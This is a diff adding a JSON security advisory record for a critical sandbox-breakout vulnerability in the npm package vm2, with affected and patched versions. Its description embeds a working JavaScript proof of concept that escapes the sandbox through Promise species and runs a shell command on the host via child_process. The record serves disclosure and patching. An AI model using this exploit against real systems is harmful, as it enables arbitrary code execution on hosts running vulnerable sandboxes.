@@ -1,0 +1,56 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-05-29T17:40:15Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "vm2"
+  },
+  "Advisory": {
+    "DatabaseId": 359351,
+    "Id": "GSA_kwCzR0hTQS03Nnc3LWo5Y3Etcngyas4ABXu3",
+    "GhsaId": "GHSA-76w7-j9cq-rx2j",
+    "References": [
+      {
+        "Url": "https://github.com/patriksimek/vm2/security/advisories/GHSA-76w7-j9cq-rx2j"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/commit/a462655009669c3124ee39498121651597529ea8"
+      },
+      {
+        "Url": "https://github.com/patriksimek/vm2/releases/tag/v3.11.4"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-76w7-j9cq-rx2j"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-76w7-j9cq-rx2j"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-47208"
+      }
+    ],
+    "Description": "### Summary\n\nVM2 suffers from a sandbox breakout vulnerability. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.\n\n### Details\n\nThe `localPromise` constructor was changed to call `this.then(undefined, eater)` to ensure a rejected promise is always used. However, this is missing a call to `resetPromiseSpecies` to ensure that `this` has no special species. Since the species can be changed a custom promise can be used to supply a custom reject method to the executor allowing to get a raw host error and escape the sandbox.\n\n### PoC\n\n```js\nconst {VM} = require(\"vm2\");\nconst vm = new VM();\nvm.run(`\nclass E extends Error {}\nfunction so(d) {\n\tif (d \u003e 0) so(d-1);\n\tconst e = new E();\n\te.stack;\n\tthrow e;\n}\nlet ex, ct;\nclass FakePromise extends Promise {\n\tstatic get [Symbol.species](){return ct;}\n}\nfunction doCatch(f) {\n\tex=undefined;\n\tconst p=Promise.withResolvers();\n\tct = function(e){e(f, v=\u003e{ex=v;p.resolve();})};\n\tnew FakePromise(r=\u003er());\n\treturn p.promise;\n}\n(async function f(s) {\n\tlet min = s;\n\tlet max = 100000;\n\twhile (min\u003cmax) {\n\t\tconst mid = (min+max)\u003e\u003e1;\n\t\tawait doCatch(()=\u003eso(mid));\n\t\tif (ex.name===\"RangeError\" \u0026\u0026 !(ex instanceof RangeError)) {\n\t\t\tex.constructor.constructor(\"return process\")().mainModule.require('child_process').execSync('touch pwned');\n\t\t\treturn;\n\t\t}\n\t\tif (ex instanceof E) {\n\t\t\tmin = mid+1;\n\t\t} else {\n\t\t\tmax = mid;\n\t\t}\n\t}\n\tf(s+1);\n})(0);\n`);\n```\n\n### Impact\n\nAttackers can perform Remote Code Execution under the assumption that the attacker can run arbitrary code execution inside the context of a vm2 sandbox.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-05-29T17:40:15Z",
+    "Severity": "CRITICAL",
+    "Summary": "vm2 is Vulnerable to Sandbox Breakout Through Promise Species",
+    "UpdatedAt": "2026-05-29T17:40:15Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 10,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "3.11.4"
+      },
+      "VulnerableVersionRange": "\u003c= 3.11.3"
+    }
+  ]
+}
